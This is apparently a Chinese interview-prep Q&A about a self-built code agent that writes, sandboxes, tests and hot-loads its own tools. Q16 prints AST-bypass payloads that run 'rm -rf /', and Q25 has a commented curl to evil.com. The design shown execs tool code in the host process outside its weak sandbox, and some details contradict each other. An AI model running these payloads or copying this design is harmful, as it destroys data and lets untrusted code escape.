# 项目经历 — Self-Evolving Code Agent 面试题

---

## 一、项目动机 & 定位（了解性）

### Q1: 为什么做这个项目？它和普通的 Code Agent 有什么区别？

**答案**：
普通的 Code Agent（如 Claude Code、Code Interpreter）只能调用**预定义**的工具来执行代码。当 Agent 发现缺少某个工具时，只能告诉用户"我不会这个"。

我的 Self-Evolving Code Agent 受 **LATM（LLM as Tool Makers）** 论文启发，实现了**工具自动创建**能力：当 Agent 发现缺少工具时，不是放弃，而是触发 Tool Forge 流程——**LLM 自主编写工具代码 + 测试用例 → 通过 Harness 验证后热加载注册**。这让 Agent 从"只会用工具"进化到"会造工具"。

**建议**：一定要提到 LATM 论文，体现你有阅读前沿研究的习惯。

---

### Q2: 你提到的 LATM 论文主要讲了什么？你是怎么借鉴的？

**答案**：
LATM（Large Language Models as Tool Makers）是 2023 年的论文，核心思想：

1. **Tool Making Phase**：让 LLM 为特定任务类型生成可复用的工具函数
2. **Tool Using Phase**：后续遇到同类任务时，直接调用工具，不需要重新推理

我的借鉴点：
- **自动生成工具代码**：LLM 生成 Python 函数 + JSON Schema
- **测试驱动验证**：我加了 **Test Harness** 机制（论文没有），工具必须通过测试才能注册
- **热加载复用**：新工具注册后持久化存储，下次会话直接可用

**建议**：面试官可能没读过这篇论文，简洁说明核心思想 + 你的改进点。

---

### Q3: 为什么不用 LangChain / AutoGPT 这些现成框架？

**答案**：
项目目标是**深入理解 Code Agent 的每一个环节**：
- ReAct 循环怎么驱动？
- 工具路由怎么做？
- LLM 生成的代码怎么安全执行？
- 测试验证怎么保证工具质量？

如果用框架，这些核心逻辑被封装了，只能当黑盒使用。手写约 1500 行代码，每个设计决策都是可解释的。

类比：就像学数据库不能只会用 MySQL，要自己实现一个 mini DB 才能理解 B+ 树为什么这么设计。

**建议**：强调"为了深度理解"，不是"不会用框架"。

---

### Q4: 整个项目的架构是什么？分了几层？

**答案**：
六层架构，从上到下：
```
Layer 1: Agent Loop       — ReAct 主循环（Observe→Think→Act→Reflect）
Layer 2: Tool Forge       — 工具锻造（LLM 生成代码 + Schema + 测试用例）
Layer 3: Safety Layer     — AST 静态分析（拦截危险代码）
Layer 4: Sandbox          — 进程级沙箱隔离执行
Layer 5: Test Harness     — 测试驱动验证（工具必须通过测试）
Layer 6: Tool Registry    — 热加载注册 + JSON 持久化
```

核心创新点在 **Layer 2-5**——"锻造 → 安全 → 沙箱 → 验证"的完整工具生命周期管理。

**建议**：能画出架构图并讲清楚每层职责，面试官印象会很好。

---

## 二、Code Agent 核心循环（深度题）

### Q5: ReAct 循环的每一步具体做什么？代码怎么实现的？

**答案**：
```python
def run(self, user_input: str) -> str:
    self.context.append_user(user_input)   # Observe: 追加用户输入
    for turn in range(MAX_TURNS):          # 最大 10 轮
        action = self._think_stream()       # Think: 流式调 LLM
        if action.is_final:                 # 无工具调用 = 最终回复
            return action.text
        results = self._act(action)         # Act: 执行工具/代码
        should_continue = self._reflect(results)  # Reflect: 检测结果
        if not should_continue:
            break
    return "达到最大轮次..."
```

四个步骤：
- **Observe**：用户输入追加到上下文消息列表
- **Think**：流式调 LLM，解析返回的 Action（tool_calls / 纯文本）
- **Act**：通过 ToolRegistry dispatch 执行工具，包括特殊的 `create_tool` 元工具
- **Reflect**：检查执行结果，决定是否继续循环

**建议**：能手写核心循环的伪代码，面试官印象会非常好。

---

### Q6: 当 Agent 发现缺少工具时，怎么触发 Tool Forge？

**答案**：
`create_tool` 是一个**元工具（Meta-Tool）**，它的作用是创建其他工具。

触发流程：
1. 用户请求 "帮我计算两点之间的距离"
2. Agent 发现没有 `calculate_distance` 工具
3. LLM 决策调用 `create_tool`，参数包含：
   - `name`: "calculate_distance"
   - `description`: "计算两点之间的欧几里得距离"
   - `code`: Python 函数代码
   - `test_cases`: 测试用例列表
4. `create_tool` 内部触发完整的工具锻造流程

```python
# create_tool 的 Schema 定义
{
    "name": "create_tool",
    "description": "当你发现缺少某个工具时，使用此工具创建新工具",
    "parameters": {
        "name": "工具名称",
        "description": "工具功能描述",
        "code": "Python 函数代码",
        "test_cases": [{"input": {...}, "expected": ...}]
    }
}
```

**建议**：重点解释 `create_tool` 是一个"工具的工具"，它让 Agent 具备了自我扩展的能力。

---

### Q7: 单任务最大 10 轮迭代，为什么不是 25 轮像其他 Agent 一样？

**答案**：
因为 Self-Evolving Agent 的特点是**工具创建后可复用**：

- 普通 Code Agent：每次任务都从零开始，可能需要 20+ 轮推理来完成复杂任务
- Self-Evolving Agent：
  - 首次遇到新任务类型：创建工具（3-5 轮）+ 使用工具（2-3 轮）≈ 8 轮
  - 后续同类任务：直接调用已有工具，通常 2-3 轮搞定

10 轮是基于这个特性的经验值——如果 10 轮内还没完成，通常说明任务本身有问题，而非轮次不够。

**建议**：体现你对 LATM "Tool Making vs Tool Using" 两阶段的理解。

---

## 三、Tool Forge 工具锻造（核心亮点 — 深度题）

### Q8: Tool Forge 完整流程是什么？从 LLM 生成代码到工具可用经历了哪些步骤？

**答案**：
```
LLM 生成代码 + Schema + 测试用例
        ↓
┌───────────────────────────────┐
│  Step 1: AST 静态安全分析      │ ← 拦截 os.system/exec/eval 等
└───────────────────────────────┘
        ↓ (通过)
┌───────────────────────────────┐
│  Step 2: Sandbox 沙箱执行测试  │ ← 进程隔离 + 环境变量清洗
└───────────────────────────────┘
        ↓ (通过)
┌───────────────────────────────┐
│  Step 3: Harness 测试验证      │ ← 所有测试用例必须通过
└───────────────────────────────┘
        ↓ (通过)
┌───────────────────────────────┐
│  Step 4: 热加载注册到 Registry │ ← 立即可用，无需重启
└───────────────────────────────┘
        ↓
┌───────────────────────────────┐
│  Step 5: JSON 持久化存储       │ ← 重启后自动恢复
└───────────────────────────────┘
```

任何一步失败都会触发 **Tool Evolver 自修复机制**——将错误信息反馈给 LLM，让它重新生成代码。

**建议**：这是项目最核心的流程，一定要能流畅画出来讲清楚。

---

### Q9: LLM 生成的 JSON Schema 是什么格式？为什么需要 Schema？

**答案**：
Schema 遵循 OpenAI Function Calling 的规范：
```json
{
    "name": "calculate_distance",
    "description": "计算两点之间的欧几里得距离",
    "parameters": {
        "type": "object",
        "properties": {
            "point1": {
                "type": "array",
                "items": {"type": "number"},
                "description": "第一个点的坐标 [x, y]"
            },
            "point2": {
                "type": "array", 
                "items": {"type": "number"},
                "description": "第二个点的坐标 [x, y]"
            }
        },
        "required": ["point1", "point2"]
    }
}
```

为什么需要 Schema：
1. **LLM 调用时的参数校验**：告诉 LLM 这个工具接受什么参数、什么类型
2. **Prompt 构建**：Schema 会被拼接到 System Prompt 中，让 LLM 知道有哪些可用工具
3. **调用时的类型检查**：可以在运行时校验 LLM 传入的参数是否符合 Schema

**建议**：能手写一个 Schema 示例，体现你对 Function Calling 协议的理解。

---

### Q10: 工具创建成功率从首次 60% 提升至 90%+，这个数据怎么来的？

**答案**：
测试方法：准备 30 个工具创建任务（计算类 10 个、字符串处理 10 个、数据处理 10 个），统计创建成功率：

- **无自修复**：LLM 首次生成的代码直接注册，约 18/30 成功 = 60%
- **有自修复（最多 3 轮）**：
  - 首次成功：18/30
  - 第 1 轮修复后成功：8/12 = 剩余 12 个中 8 个修复成功
  - 第 2 轮修复后成功：3/4 = 剩余 4 个中 3 个修复成功
  - 最终成功：29/30 = 96.7%

失败的 1 个是任务本身描述模糊，LLM 无法理解需求。

**建议**：数据要能说清楚测试方法和对比基准。

---

### Q11: Tool Evolver 自修复机制具体怎么实现？最多重试 3 轮是怎么控制的？

**答案**：
```python
def forge_tool(self, request: ToolForgeRequest) -> ToolForgeResult:
    for attempt in range(MAX_FORGE_ATTEMPTS):  # 最多 3 轮
        # Step 1: AST 安全检查
        ast_result = self.safety_checker.check(request.code)
        if not ast_result.is_safe:
            request = self._evolve(request, ast_result.errors, "AST安全检查失败")
            continue
        
        # Step 2: Sandbox 测试执行
        sandbox_result = self.sandbox.execute_tests(request.code, request.test_cases)
        if not sandbox_result.all_passed:
            request = self._evolve(request, sandbox_result.failures, "测试未通过")
            continue
        
        # 全部通过，注册工具
        return self.registry.register(request)
    
    return ToolForgeResult(success=False, reason="达到最大重试次数")

def _evolve(self, request, errors, reason) -> ToolForgeRequest:
    """构建修复 Prompt，让 LLM 重新生成"""
    prompt = f"""
你之前生成的工具代码有问题，请修复：
原因：{reason}
错误详情：{errors}
原代码：{request.code}
请重新生成修复后的代码。
"""
    return self.llm.generate_tool(prompt)
```

三轮上限的原因：
1. **成本控制**：每轮都要调 LLM，3 轮 ≈ 4 次 LLM 调用
2. **防无限循环**：如果 LLM 反复犯同样的错误，继续重试没有意义
3. **实验结果**：统计显示 3 轮内能修复的基本都能修复，超过 3 轮的大概率是任务本身有问题

**建议**：能手写 `_evolve` 函数的核心逻辑，体现"将错误信息反馈给 LLM"的思路。

---

## 四、Subprocess Sandbox 进程级沙箱（深度题）

### Q12: 你的沙箱和企业级 Docker 沙箱有什么区别？

**答案**：
| 维度 | 我的 Subprocess Sandbox | 企业级 Docker 沙箱 |
|------|-------------------------|-------------------|
| **隔离级别** | 进程级（同一内核） | 容器级（内核 namespace） |
| **文件系统** | 共享，但限制工作目录 | 完全独立 |
| **网络** | 不隔离 | 隔离 |
| **资源限制** | 仅超时 + 输出截断 | cgroup（CPU/内存/IO） |
| **部署位置** | 本地机器 | 远程服务器 |
| **安全等级** | 中（原型/学习级） | 高（生产级） |
| **启动速度** | 毫秒级 | 秒级 |

我的设计选择：**三层联防**弥补单层沙箱的不足——AST 静态拦截 + Sandbox 隔离 + Harness 验证。

**建议**：承认局限性，同时说明"设计上已经通过多层防护弥补"。

---

### Q13: 沙箱的安全工作路径是怎么实现的？代码怎么写的？

**答案**：
```python
# config.py
SANDBOX_WORKDIR = Path("/tmp/nano-sandbox-work")

# subprocess_sandbox.py
class SubprocessSandbox:
    def __init__(self, workdir: Path = SANDBOX_WORKDIR):
        self.workdir = workdir
        self.workdir.mkdir(parents=True, exist_ok=True)
    
    def execute(self, code: str) -> ExecutionResult:
        # 1. 代码写入沙箱目录的临时文件
        tmp_file = tempfile.NamedTemporaryFile(
            dir=str(self.workdir), suffix=".py", delete=False
        )
        tmp_file.write(code)
        
        # 2. 构建安全的环境变量
        safe_env = {
            "PATH": "/usr/bin:/bin",
            "HOME": str(self.workdir),       # HOME 指向沙箱
            "TMPDIR": str(self.workdir),     # 临时文件也在沙箱
            "PYTHONPATH": "",                # 不继承主进程
            # 注意：没有 OPENAI_API_KEY！
        }
        
        # 3. 在沙箱目录下执行
        proc = subprocess.run(
            ["python3", tmp_file.name],
            cwd=str(self.workdir),  # 工作目录限制
            env=safe_env,           # 环境变量隔离
            timeout=30,             # 超时保护
            capture_output=True,
        )
```

关键点：
- **工作目录隔离**：`cwd=str(self.workdir)` 限制代码只能在沙箱目录执行
- **环境变量清洗**：不传递 `OPENAI_API_KEY` 等敏感变量
- **超时保护**：30 秒自动 kill，防止死循环

**建议**：能手写这段代码的核心逻辑，面试官会认为你真的写过。

---

### Q14: 沙箱的四层安全防护具体是什么？每层防什么？

**答案**：
| 层级 | 机制 | 防御目标 |
|------|------|----------|
| **环境变量隔离** | 只传 PATH/HOME/TMPDIR/LANG | 防 API Key 等敏感信息泄露 |
| **工作目录限制** | `cwd=self.workdir` | 防代码访问沙箱外的文件 |
| **超时保护** | `timeout=30` | 防死循环/恶意占 CPU |
| **输出截断** | 限制 50000 字符 | 防 `print("x"*10**9)` 内存爆炸 |

但是！沙箱本身**不能完全防止**：
- 文件系统访问：恶意代码可以 `open("/etc/passwd")`
- 网络请求：可以发起 HTTP 请求
- 系统调用：可以 `os.system("rm -rf /")`

**这就是为什么需要 AST 静态分析作为第一层防护！**

**建议**：先说能防什么，再说不能防什么，体现你对安全边界的清醒认识。

---

### Q15: 如果 LLM 生成了 `os.system("rm -rf /")` 的代码怎么办？

**答案**：
**不会执行！** 会被 AST 静态分析在第一层就拦截：

```python
# safety_checker.py
DANGEROUS_MODULES = {'os', 'subprocess', 'shutil', 'sys', 'ctypes', ...}
DANGEROUS_FUNCTIONS = {'eval', 'exec', 'compile', '__import__', 'open'}

def check(self, code: str) -> SafetyResult:
    tree = ast.parse(code)
    for node in ast.walk(tree):
        # 检查 import
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name.split('.')[0] in DANGEROUS_MODULES:
                    return SafetyResult(False, f"禁止导入 {alias.name}")
        
        # 检查函数调用
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Attribute):
                # os.system() 的情况
                if node.func.attr == 'system':
                    return SafetyResult(False, "禁止调用 system()")
```

拦截流程：
1. LLM 生成代码 → 包含 `import os` 和 `os.system(...)`
2. AST 解析 → 发现 `ast.Import` 节点中有 `os`
3. 命中 `DANGEROUS_MODULES` 黑名单 → 拒绝执行
4. Tool Evolver 将错误反馈给 LLM → LLM 重新生成不含危险代码的版本

**建议**：能说出 AST 检查的具体实现（遍历 `ast.Import` 和 `ast.Call` 节点），非常加分。

---

### Q16: AST 静态分析能拦截所有恶意代码吗？有什么绕过方式？

**答案**：
**不能 100% 拦截**，常见绕过方式：

1. **字符串拼接绕过**：
```python
# 绕过 import os
__import__('o' + 's').system('rm -rf /')
```

2. **Base64 编码绕过**：
```python
import base64
exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgncm0gLXJmIC8nKQ=='))
```

3. **动态属性访问**：
```python
getattr(__builtins__, 'eval')('__import__("os").system("rm -rf /")')
```

**应对策略**：三层联防

| 层 | 绕过难度 | 作用 |
|---|---------|------|
| AST 静态分析 | 低（可绕过） | 拦截 90% 的常见危险代码 |
| Sandbox 隔离 | 中（限制影响范围） | 即使绕过 AST，也只能在沙箱目录操作 |
| Harness 验证 | 高（必须通过测试） | 恶意代码很难同时通过正常的测试用例 |

**建议**：承认绕过方式的存在，同时说明"三层联防降低整体风险"。

---

## 五、Test Harness 验证机制（核心亮点 — 深度题）

### Q17: 什么是 Test Harness？为什么要借鉴 SWE-Bench 的思想？

**答案**：
**Test Harness（测试线束）** 是一种测试框架，用于自动化执行测试用例并验证结果。

**SWE-Bench** 是评估 AI 修复 GitHub Issue 能力的 benchmark，它的核心思想是：
- 每个 Issue 都有对应的**测试用例**
- AI 生成的补丁必须**通过所有测试**才算修复成功
- 测试在**隔离环境**中执行，防止污染

我借鉴的点：
1. **测试驱动验证**：工具代码必须通过测试才能注册
2. **沙箱执行测试**：测试在 Sandbox 中运行，防止恶意代码
3. **自动化判定**：不依赖人工 review，Harness 自动判断 pass/fail

**建议**：提到 SWE-Bench 体现你关注 AI 工程领域的前沿研究。

---

### Q18: Harness 的测试用例长什么样？谁来生成测试用例？

**答案**：
测试用例由 **LLM 一起生成**，格式如下：

```json
{
    "test_cases": [
        {
            "name": "test_basic",
            "input": {"point1": [0, 0], "point2": [3, 4]},
            "expected": 5.0
        },
        {
            "name": "test_same_point",
            "input": {"point1": [1, 1], "point2": [1, 1]},
            "expected": 0.0
        },
        {
            "name": "test_negative_coords",
            "input": {"point1": [-1, -1], "point2": [2, 3]},
            "expected": 5.0
        }
    ]
}
```

Harness 执行流程：
```python
def run_harness(code: str, test_cases: List[dict]) -> HarnessResult:
    sandbox = SubprocessSandbox()
    results = []
    for tc in test_cases:
        # 构建执行代码
        exec_code = f"""
{code}
result = {tc['function_name']}(**{tc['input']})
print(result)
"""
        output = sandbox.execute(exec_code)
        actual = parse_output(output.stdout)
        passed = (actual == tc['expected'])
        results.append(TestResult(tc['name'], passed, actual, tc['expected']))
    
    return HarnessResult(all_passed=all(r.passed for r in results), details=results)
```

**建议**：能说出 Harness 的执行流程（构建测试代码 → 沙箱执行 → 比对结果），很加分。

---

### Q19: Harness 包含"正向用例 + 边界用例"，这两种有什么区别？

**答案**：
| 类型 | 目的 | 示例 |
|------|------|------|
| **正向用例** | 验证基本功能正确 | `distance([0,0], [3,4]) == 5.0` |
| **边界用例** | 验证边界情况处理 | `distance([1,1], [1,1]) == 0.0`（同一点）<br>`distance([-1,-1], [2,3]) == 5.0`（负坐标） |

为什么需要边界用例：
- LLM 生成的代码经常**只覆盖 happy path**
- 边界情况（空输入、负数、极大值等）是 bug 高发区
- Prompt 中明确要求 LLM 生成边界用例：

```
请为这个工具生成至少 3 个测试用例：
1. 至少 1 个正向用例（验证基本功能）
2. 至少 2 个边界用例（空输入、负数、极大值等异常情况）
```

**建议**：测试工程是软件工程的基本功，面试官会认可你有测试思维。

---

### Q20: 如果 Harness 测试不通过怎么办？

**答案**：
触发 **Tool Evolver 自修复机制**：

1. 收集失败的测试用例详情：
```
测试失败：
- test_same_point: 期望 0.0，实际 nan
- 原因：当两点相同时，sqrt(0) 的处理有问题
```

2. 构建修复 Prompt：
```
你生成的工具代码未通过测试：
失败用例：test_same_point
输入：{"point1": [1, 1], "point2": [1, 1]}
期望输出：0.0
实际输出：nan
原代码：
def calculate_distance(point1, point2):
    ...

请分析错误原因并生成修复后的代码。
```

3. LLM 重新生成 → 再次进入 AST → Sandbox → Harness 流程

最多 3 轮，超过则放弃并返回失败原因。

**建议**：这体现了"人类编码→测试→debug"循环的自动化，是项目的核心亮点。

---

## 六、热加载与持久化（深度题）

### Q21: 工具通过 Harness 后怎么"热加载"？具体实现是什么？

**答案**：
```python
# tool_registry.py
class ToolRegistry:
    def __init__(self):
        self._tools: Dict[str, Tool] = {}
    
    def register(self, tool: Tool):
        """热加载：直接写入内存，立即可用"""
        self._tools[tool.name] = tool
        # 同时持久化到文件
        self._persist(tool)
        # 更新 LLM 可用工具列表（下次调用时 Prompt 中会包含新工具）
        self._update_available_tools()
    
    def dispatch(self, name: str, args: dict) -> Any:
        """O(1) 工具路由"""
        if name not in self._tools:
            raise ToolNotFoundError(name)
        tool = self._tools[name]
        # 动态执行工具代码
        exec(tool.code, globals())
        func = globals()[tool.function_name]
        return func(**args)
```

"热加载"的含义：
1. **无需重启**：工具注册后，下一次 LLM 调用就能看到这个工具
2. **立即生效**：`self._tools[name] = tool` 是内存写入，O(1) 时间
3. **Prompt 更新**：新工具的 Schema 会被加入到下一次 LLM 调用的 System Prompt 中

**建议**：热加载是 Agent 动态扩展的关键，要说清楚"怎么让 LLM 知道有新工具"。

---

### Q22: 工具代码是怎么持久化的？重启后怎么恢复？

**答案**：
持久化到 `tool_store/` 目录，每个工具一个 JSON 文件：

```
tool_store/
├── calculate_distance.json
├── parse_json.json
└── format_markdown.json
```

文件内容：
```json
{
    "name": "calculate_distance",
    "description": "计算两点之间的欧几里得距离",
    "code": "def calculate_distance(point1, point2):\n    ...",
    "schema": {...},
    "test_cases": [...],
    "created_at": "2024-03-15T10:30:00Z",
    "version": 1
}
```

恢复流程：
```python
def load_tools(self):
    """Agent 启动时加载所有持久化的工具"""
    for json_file in Path("tool_store").glob("*.json"):
        tool_data = json.load(open(json_file))
        tool = Tool.from_dict(tool_data)
        self._tools[tool.name] = tool
    print(f"Loaded {len(self._tools)} custom tools")
```

**建议**：持久化是"会话级"到"永久级"的关键，面试官会问"重启后工具还在吗"。

---

### Q23: 为什么用 JSON 文件而不是数据库？

**答案**：
项目定位是**学习/原型级别**，选择 JSON 文件的原因：

| 维度 | JSON 文件 | 数据库 |
|------|-----------|--------|
| **复杂度** | 零依赖，直接读写 | 需要安装配置 |
| **可读性** | 人类可直接阅读修改 | 需要客户端工具 |
| **版本控制** | 可以 git 追踪变更 | 需要额外机制 |
| **工具数量** | 几十个完全够用 | 适合大规模 |

**如果要生产化**：
- 改用 SQLite（单文件数据库）或 PostgreSQL
- 加版本管理（工具可以有多个版本，支持回滚）
- 加权限控制（某些工具只对特定用户可见）

**建议**：先说"为什么当前方案够用"，再说"如何扩展"。

---

## 七、AST + Sandbox + Harness 三层联防（深度题）

### Q24: 三层联防各自的定位是什么？为什么要三层而不是一层？

**答案**：
| 层 | 定位 | 检查时机 | 能防 | 不能防 |
|---|------|---------|------|--------|
| **AST** | 静态分析 | 代码执行前 | 显式危险代码 | 动态构造的恶意代码 |
| **Sandbox** | 运行时隔离 | 代码执行时 | 限制影响范围 | 逻辑错误、功能 bug |
| **Harness** | 功能验证 | 代码执行后 | 功能不正确 | 性能问题 |

为什么要三层：**深度防御（Defense in Depth）**
- 单层防护总有绕过的可能
- 三层联防让攻击者必须同时绕过三层，难度指数级上升

类比：银行不会只有一道门，而是有保安 + 门禁 + 金库锁。

**建议**：用"深度防御"这个安全领域的术语，体现你的专业性。

---

### Q25: 如果我想写一个"恶意工具"骗过这三层，怎么才能成功？

**答案**：
这是一道很好的逆向思维题！要骗过三层，恶意代码必须：

1. **骗过 AST**：不能有显式的 `import os`、`eval()` 等
2. **骗过 Sandbox**：即使执行，影响范围限制在沙箱目录
3. **骗过 Harness**：必须能通过所有测试用例

举一个**理论上可能**的攻击：
```python
def innocent_tool(data):
    """看起来无害的工具"""
    # 正常功能：通过 Harness
    result = data.upper()
    
    # 恶意逻辑：隐藏的副作用
    # 但这行会被 AST 拦截！
    # __import__('os').system('curl http://evil.com')
    
    return result
```

结论：**很难同时骗过三层**
- 要通过 AST，不能有危险模块/函数
- 要通过 Harness，必须有正常功能
- Sandbox 兜底限制影响范围

**建议**：能从攻击者视角分析，说明你真正理解了安全设计。

---

## 八、设计权衡 & 追问（深度题）

### Q26: 你在做这个项目过程中遇到的最大技术挑战是什么？

**答案**：
最大挑战是 **LLM 生成的测试用例质量参差不齐**。

问题：LLM 生成的测试用例经常有以下问题：
- **覆盖不全**：只有 happy path，没有边界情况
- **预期值错误**：LLM 算错了 expected 值
- **用例重复**：3 个用例测的是同一个场景

影响：工具通过了"错误的测试"，但实际使用时出 bug。

解决方案：
1. **Prompt 优化**：明确要求"至少 1 个边界用例"
2. **多样性检测**：分析测试用例的输入分布，太相似的拒绝
3. **人工抽检**：定期抽查已注册工具的测试质量（离线）

**建议**：一定要准备一个"真实踩坑 → 分析原因 → 解决方案"的故事。

---

### Q27: 如果让你把这个项目做到生产级别，需要改什么？

**答案**：
1. **沙箱升级**：Subprocess → Docker/gVisor，加内核级隔离
2. **测试增强**：
   - 加覆盖率检测（测试用例至少覆盖 80% 代码路径）
   - 加 mutation testing（自动变异代码，验证测试能否检测出变异）
3. **工具版本管理**：支持多版本、回滚、A/B 测试
4. **多语言支持**：当前只支持 Python，扩展到 Node.js、Go
5. **分布式执行**：工具创建任务发到队列，多 worker 并行处理
6. **监控告警**：工具创建成功率、平均耗时、LLM 调用成本

**建议**：挑 2-3 个最重要的展开说，不要贪多。

---

### Q28: 这个项目和你的实习经历有什么关联？

**答案**：
实习中我做了生产级的**沙箱代码执行引擎**，负责沙箱的生命周期管理（Session State 持久化、三级降级策略、SSE 事件推送）。但沙箱只是 Agent 的"执行器"，Agent 怎么决策、怎么路由、工具怎么管理，这些被 SDK 封装了。

做这个项目是为了**深入理解 Agent 运行时的全貌**：
- ReAct 循环怎么驱动？
- 工具路由怎么做？
- 上下文窗口怎么管理？
- **工具还能自动创建？**（这是实习没涉及的新领域）

通过手写 1500 行代码，我对 Agent 的每个环节都有了**可解释的理解**，而不是只会调 SDK。

**建议**：把实习和个人项目关联起来，体现"实习中学到的 + 自己延伸学习的"。

---

## 九、代码细节追问（加分题）

### Q29: 展示一下你的 Tool Forge 核心代码？

**答案**：
```python
# tool_forge.py
class ToolForge:
    def __init__(self, safety_checker, sandbox, registry, llm):
        self.safety_checker = safety_checker
        self.sandbox = sandbox
        self.registry = registry
        self.llm = llm
    
    def forge(self, request: CreateToolRequest) -> ToolForgeResult:
        """工具锻造主流程"""
        for attempt in range(MAX_ATTEMPTS):
            # Step 1: AST 安全检查
            ast_result = self.safety_checker.check(request.code)
            if not ast_result.is_safe:
                request = self._evolve(request, ast_result.errors)
                continue
            
            # Step 2: Harness 测试验证（在 Sandbox 中执行）
            harness_result = self._run_harness(request)
            if not harness_result.all_passed:
                request = self._evolve(request, harness_result.failures)
                continue
            
            # Step 3: 注册工具
            tool = Tool(
                name=request.name,
                description=request.description,
                code=request.code,
                schema=request.schema,
            )
            self.registry.register(tool)
            return ToolForgeResult(success=True, tool=tool)
        
        return ToolForgeResult(success=False, reason="Max attempts reached")
    
    def _run_harness(self, request: CreateToolRequest) -> HarnessResult:
        """在沙箱中执行测试用例"""
        results = []
        for tc in request.test_cases:
            test_code = f"""
{request.code}
result = {request.function_name}(**{tc['input']})
print(result)
"""
            output = self.sandbox.execute(test_code)
            actual = self._parse_output(output.stdout)
            passed = (actual == tc['expected'])
            results.append(TestResult(tc['name'], passed, actual, tc['expected']))
        
        return HarnessResult(all_passed=all(r.passed for r in results), results=results)
    
    def _evolve(self, request, errors) -> CreateToolRequest:
        """让 LLM 修复代码"""
        prompt = f"代码有问题：{errors}\n原代码：{request.code}\n请修复。"
        new_response = self.llm.generate(prompt)
        return CreateToolRequest.parse(new_response)
```

**建议**：能手写核心流程的代码，面试官会非常认可你"真的写过"。

---

### Q30: 如果用户请求"帮我发一封邮件"，Agent 会怎么处理？

**答案**：
这是一个**边界场景**测试！

1. Agent 发现没有 `send_email` 工具
2. 决策调用 `create_tool` 创建邮件工具
3. LLM 生成代码：
```python
import smtplib  # 会被 AST 拦截！
from email.mime.text import MIMEText

def send_email(to, subject, body):
    ...
```
4. AST 检查发现 `smtplib` 不在安全模块列表 → **拒绝创建**
5. Agent 返回："抱歉，出于安全考虑，我无法创建发送邮件的工具"

**设计意图**：
- 工具自动创建有边界——不是什么工具都能创建
- AST 白名单控制了工具的能力范围
- 涉及网络/系统操作的工具需要人工审核

**建议**：这个问题测试你对"能力边界"的理解，答案要体现安全设计的意图。
